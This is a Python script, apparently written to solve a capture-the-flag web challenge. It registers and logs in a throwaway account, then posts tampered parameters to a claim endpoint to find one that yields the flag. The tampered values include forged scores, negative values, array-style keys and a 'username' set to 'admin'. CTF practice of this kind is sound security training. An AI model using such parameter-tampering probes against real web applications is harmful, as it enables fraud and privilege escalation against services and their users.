import requests, threading, time, random, string

base = 'https://web-random-cheese.tracebash.xyz'

# Approach: claim BEFORE spinning, while score=0 (maybe negative?)
# Check if we can provide 'score' as a POST param to override
s = requests.Session()
name = ''.join(random.choices(string.ascii_lowercase, k=8))
s.post(f'{base}/register', data={'username': name, 'password': name})
s.post(f'{base}/login', data={'username': name, 'password': name})

# Try claim with various params
params_list = [
    {'score': '85'},
    {'score': '100'},
    {'score': '85', 'spins': '10'},
    {'score': '-1000'},
    {'score': '9999999', 'spins': '999'},
    {'score[]': '85'},
    {'score': '85', 'spins': '10', 'username': 'admin'},
]

for params in params_list:
    r = s.post(f'{base}/claim', data=params)
    if 'flag' in r.text.lower() or 'CTF' in r.text or 'Congratulations' in r.text:
        print(f'SUCCESS with params {params}')
        print(r.text[:1500])
        import re
        for match in re.findall(r'[A-Z]{3,}\{[^}]+\}', r.text):
            print(f'FLAG: {match}')
        break
    else:
        # Get the flash message
        import re
        spans = re.findall(r'<span[^>]*>([^<]+)</span>', r.text)
        for span in spans:
            if 'score' in span.lower() or 'need' in span.lower() or 'flag' in span.lower():
                print(f'Params {params}: {repr(span)}')